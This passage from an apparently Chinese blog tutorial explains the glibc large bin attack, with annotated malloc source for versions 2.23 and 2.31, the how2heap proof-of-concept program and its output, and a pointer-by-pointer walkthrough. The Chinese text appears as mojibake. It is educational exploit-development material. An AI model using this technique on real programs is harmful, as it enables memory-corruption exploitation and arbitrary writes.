bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">&#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size)) <span class="comment">//åˆ¤æ–­sizeæ˜¯ä¸æ˜¯å±äºsmallbin</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;<span class="comment">//bckçš„fdå­˜æ”¾æœ€å¤§chunkï¼Œbkå­˜æ”¾æœ€å°chunk</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//è¿™é‡Œå¼€å§‹å°±æ˜¯æ”¾å…¥largebin</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)<span class="comment">//å¦‚æœç›¸ç­‰è¯æ˜ä»–æ˜¯è¿™ä¸ªç»„é‡Œé¢ç¬¬ä¸€ä¸ªï¼Œä¸ç›¸ç­‰è¯´æ˜largebiné‡Œæœ‰å…¶ä»–çš„chunkäº†éœ€è¦è¿›è¡Œæ¯”è¾ƒï¼Œç»´æŒå¤§å°é¡ºåº</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)<span class="comment">//æ‰¾ä¸€ä¸ªæ¯”å½“å‰victim-&gt;sizeè¦&gt;=çš„åœ°æ–¹é“¾æ¥é“¾æ¥è¿›å»</span></span><br><span class="line">            &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)<span class="comment">//å¦‚æœç­‰äº</span></span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span><span class="comment">// victim-&gt;size &gt; fwd-&gt;size</span></span><br><span class="line">            &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<span class="comment">//fwd != bck)ç›¸ç­‰è¯æ˜ä»–æ˜¯è¿™ä¸ªå¤§å°çš„ç»„é‡Œé¢ç¬¬ä¸€ä¸ªç›´æ¥æŠŠfd_nextsizeå’Œbk_nextsizeæŒ‡å‘è‡ªå·±</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><p><a href="https://gdufs-king.github.io/2020/05/09/Glibc2.31%E4%B8%8B%E7%9A%84check%E6%9C%BA%E5%88%B6%E5%92%8C%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/">https://gdufs-king.github.io/2020/05/09/Glibc2.31%E4%B8%8B%E7%9A%84check%E6%9C%BA%E5%88%B6%E5%92%8C%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</a></p><p>åŠ å…¥äº†checkï¼Œåªèƒ½æ”¾æ¯”åŸæ¥çš„å°çš„chunkäº†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim_index = largebin_index (size);</span><br><span class="line">bck = bin_at (av, victim_index);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">        &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">    &#123;<span class="comment">//ç°åœ¨çš„å †å—victimæ¯”å·²ç»å­˜åœ¨çš„chunk(fwd-&gt;fd)å°ï¼Œè¿›å…¥è¿™ä¸ªåˆ†æ”¯ï¼Œé€‚åˆæ‰€æœ‰ç‰ˆæœ¬</span></span><br><span class="line">        fwd = bck;</span><br><span class="line">        bck = bck-&gt;bk;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//fwd-&gt;fd-&gt;bk_nextsizeè¢«æˆ‘ä»¬æ”¹æˆä»»æ„å¯å†™åœ°å€å€¼</span></span><br><span class="line">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        <span class="comment">//æ¼æ´è§¦å‘ç‚¹ï¼Œå®ç°ä»»æ„åœ°å€çš„fd_nextsizeå†™å…¥å †åœ°å€</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        assert (chunk_main_arena (fwd));</span><br><span class="line">        <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">            == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">            <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">            fwd = fwd-&gt;fd;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123; &#123;<span class="comment">//ç°åœ¨çš„chunkæ¯”å·²ç»å­˜åœ¨çš„chunkå¤§ï¼Œè¿›å…¥è¿™ä¸ªåˆ†æ”¯</span></span><br><span class="line">            victim-&gt;fd_nextsize = fwd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<span class="comment">//è¿™é‡Œå¯ä»¥çœ‹åˆ°åŠ å…¥äº†æ–°çš„check</span></span><br><span class="line">                <span class="comment">//å¦‚æœæˆ‘ä»¬æ”¹äº†fwd-&gt;bk_nextsizeçš„å€¼,é‚£ä¹ˆfwd-&gt;bk_nextsize-&gt;fd_nextsizeå°±ä¸æ˜¯å®ƒæœ¬èº«fwdäº†</span></span><br><span class="line">                malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">            fwd-&gt;bk_nextsize = victim;</span><br><span class="line">            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">         bck = fwd-&gt;bk;</span><br><span class="line">         <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">             malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><h2 id="How2heap-large-bin-attack"><a href="#How2heap-large-bin-attack" class="headerlink" title="How2heap large_bin_attack"></a>How2heap large_bin_attack</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    This technique is taken from</span></span><br><span class="line"><span class="comment">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">              else</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                  victim-&gt;fd_nextsize = fwd;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">                  fwd-&gt;bk_nextsize = victim;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">              bck = fwd-&gt;bk;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    mark_bin (av, victim_index);</span></span><br><span class="line"><span class="comment">    victim-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">    victim-&gt;fd = fwd;</span></span><br><span class="line"><span class="comment">    fwd-&gt;bk = victim;</span></span><br><span class="line"><span class="comment">    bck-&gt;fd = victim;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    For more details on how large-bins are handled and sorted by ptmalloc,</span></span><br><span class="line"><span class="comment">    please check the Background section in the aforementioned link.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc large_bin_attack.c -o large_bin_attack -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">                    <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">                    <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">                    <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">                    <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">                    <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">                    <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">                    <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/ctext&gt; ./large_bin_attack</span><br><span class="line">This file demonstrates large bin attack by writing a large <span class="type">unsigned</span> <span class="type">long</span> value into <span class="built_in">stack</span></span><br><span class="line">In practice, large bin attack is generally prepared <span class="keyword">for</span> further attacks, such as rewriting the global variable global_max_fast in libc <span class="keyword">for</span> further fastbin attack</span><br><span class="line"></span><br><span class="line">Let<span class="number">&#x27;</span>s first look at the targets we want to rewrite on <span class="built_in">stack</span>:</span><br><span class="line">stack_var1 (<span class="number">0x7fffffffdca8</span>): <span class="number">0</span></span><br><span class="line">stack_var2 (<span class="number">0x7fffffffdcb0</span>): <span class="number">0</span></span><br><span class="line"></span><br><span class="line">Now, we allocate the first large chunk on the heap at: <span class="number">0x603000</span></span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">Then, we allocate the second large chunk on the heap at: 0x603360</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">Finally, we allocate the third large chunk on the heap at: 0x6037a0</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">We <span class="built_in">free</span> the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x603360 &lt;--&gt; 0x603000 ]</span><br><span class="line"></span><br><span class="line">Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk <span class="keyword">for</span> allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x6030a0 ]</span><br><span class="line"></span><br><span class="line">Now, we <span class="built_in">free</span> the third large chunk and it will be inserted in the unsorted bin: [ 0x6037a0 &lt;--&gt; 0x6030a0 ]</span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s &quot;size&quot; as well as its &quot;bk&quot; and &quot;bk_nextsize&quot; pointers</span><br><span class="line">Basically, we decrease the size of the freed second large chunk to force <span class="built_in">malloc</span> to insert the freed third large chunk at the head of the large bin freelist. To overwrite the <span class="built_in">stack</span> variables, we <span class="built_in">set</span> &quot;bk&quot; to 16 bytes before stack_var1 and &quot;bk_nextsize&quot; to 32 bytes before stack_var2</span><br><span class="line"></span><br><span class="line">Let&#x27;s <span class="built_in">malloc</span> again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:</span><br><span class="line"><span class="title function_">stack_var1</span> <span class="params">(<span class="number">0x7fffffffdca8</span>)</span>: 0x6037a0</span><br><span class="line"><span class="title function_">stack_var2</span> <span class="params">(<span class="number">0x7fffffffdcb0</span>)</span>: 0x6037a0</span><br></pre></td></tr></table></figure><h3 id="å…ˆç”³è¯·äº†ä¸‰ä¸ªchunkå’Œä¸€äº›å°chunké˜²æ­¢topchunkåˆå¹¶ï¼Œé‡Šæ”¾æ‰å‰ä¸¤ä¸ªchunk"><a href="#å…ˆç”³è¯·äº†ä¸‰ä¸ªchunkå’Œä¸€äº›å°chunké˜²æ­¢topchunkåˆå¹¶ï¼Œé‡Šæ”¾æ‰å‰ä¸¤ä¸ªchunk" class="headerlink" title="å…ˆç”³è¯·äº†ä¸‰ä¸ªchunkå’Œä¸€äº›å°chunké˜²æ­¢topchunkåˆå¹¶ï¼Œé‡Šæ”¾æ‰å‰ä¸¤ä¸ªchunk"></a>å…ˆç”³è¯·äº†ä¸‰ä¸ªchunkå’Œä¸€äº›å°chunké˜²æ­¢topchunkåˆå¹¶ï¼Œé‡Šæ”¾æ‰å‰ä¸¤ä¸ªchunk</h3><p><img src="/2023/03/24/Large-bin-attack/image-20230323235004320.png" alt="image-20230323235004320"></p><h3 id="void-p4-x3D-malloc-0x90"><a href="#void-p4-x3D-malloc-0x90" class="headerlink" title="void* p4 &#x3D; malloc(0x90);"></a>void* p4 &#x3D; malloc(0x90);</h3><p>è¿™ä¸€æ­¥æ‰§è¡Œæ—¶ï¼Œæ‰€æœ‰binæ²¡æœ‰åˆé€‚å¤§å°çš„chunkï¼Œä¼šå‘ç”Ÿä¸Šé¢æºç é‡Œçš„åˆå¹¶</p><ul><li>ä»unsorted binä¸­æ‹¿å‡ºæœ€åä¸€ä¸ªp1æ”¾å…¥small bin</li><li>ä»unsorted binä¸­æ‹¿å‡ºæœ€åä¸€ä¸ªp2æ”¾å…¥large bin</li><li>ä»smallbiné‡Œåˆ†å‰²chunk p1ç»™p4ï¼ŒæŠŠå‰©ä½™éƒ¨åˆ†å†æ¬¡æ”¾å…¥unsortedbin</li></ul><p><img src="/2023/03/24/Large-bin-attack/image-20230323235716579.png" alt="image-20230323235716579"></p><h3 id="free-p3"><a href="#free-p3" class="headerlink" title="free(p3)"></a>free(p3)</h3><p>è¿›å…¥unsortedbin</p><p><img src="/2023/03/24/Large-bin-attack/image-20230324000149331.png" alt="image-20230324000149331"></p><h3 id="æ¨¡æ‹Ÿæ¼æ´"><a href="#æ¨¡æ‹Ÿæ¼æ´" class="headerlink" title="æ¨¡æ‹Ÿæ¼æ´"></a>æ¨¡æ‹Ÿæ¼æ´</h3><p>ä¿®æ”¹å</p><p><img src="/2023/03/24/Large-bin-attack/image-20230324000347943.png" alt="image-20230324000347943"></p><p>p2-&gt;size&#x3D;0x3f1</p><p>p2-&gt;bk&#x3D;stack_var1_addr - 0x10</p><p>p2-&gt;bk_nextsize&#x3D;stack_var2_addr - 0x20</p><h3 id="malloc-0x90"><a href="#malloc-0x90" class="headerlink" title="!!malloc(0x90);!!"></a>!!malloc(0x90);!!</h3><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¿˜æ˜¯ä¼šè§¦å‘ä¸Šé¢æºç </p><ul><li>ä»unsorted binä¸­æ‹¿å‡ºæœ€åä¸€ä¸ªåˆ‡å‰²p1æ”¾å…¥small bin</li><li>ä»unsorted binä¸­æ‹¿å‡ºæœ€åä¸€ä¸ªp3æ”¾å…¥large bin</li><li>ä»smallbiné‡Œåˆ†å‰²åˆ†å‰²è¿‡çš„p1ç»™mallocï¼ŒæŠŠå‰©ä½™éƒ¨åˆ†å†æ¬¡æ”¾å…¥unsortedbin</li></ul><p>ä»unsorted binä¸­æ‹¿å‡ºæœ€åä¸€ä¸ªp3æ”¾å…¥large binè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨è¿‡ç¨‹</p><p>æˆ‘ä»¬æŠŠp2-&gt;size&#x3D;0x3f1å¯ä»¥ç»•è¿‡<code> while ((unsigned long) size &lt; fwd-&gt;size)</code>ï¼Œæ¥åˆ°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p><strong>æ­¤æ—¶victimä¸ºp3ï¼Œfwdä¸ºp2</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P3-&gt;fd_nextsize = P2</span><br><span class="line"></span><br><span class="line">P3-&gt;bk_nextsize = P2-&gt;bk_nextsize=stack_var2_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">P2-&gt;bk_nextsize =P3</span><br><span class="line"></span><br><span class="line">P3-&gt;bk_nextsize-&gt;fd_nextsize = *ï¼ˆstack_var2_addr<span class="number">-0x20</span>+<span class="number">0x20</span>)= *ï¼ˆstack_var2_addrï¼‰=P3</span><br></pre></td></tr></table></figure><p>æ¥åˆ°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck=p2-&gt;bk</span><br><span class="line"></span><br><span class="line">p3-&gt;bk=p2-&gt;bk</span><br><span class="line"></span><br><span class="line">p3-&gt;fd=p2</span><br><span class="line"></span><br><span class="line">p2-&gt;bk=p3</span><br><span class="line"></span><br><span class="line">p2-&gt;bk-&gt;fd=*(stack_var1_addr - <span class="number">0x10</span>+<span class="number">0x10</span>)=*(stack_var1_addrï¼‰=P3</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨largebinæ„é€ bkå’Œbk_nextsizeæ„é€ 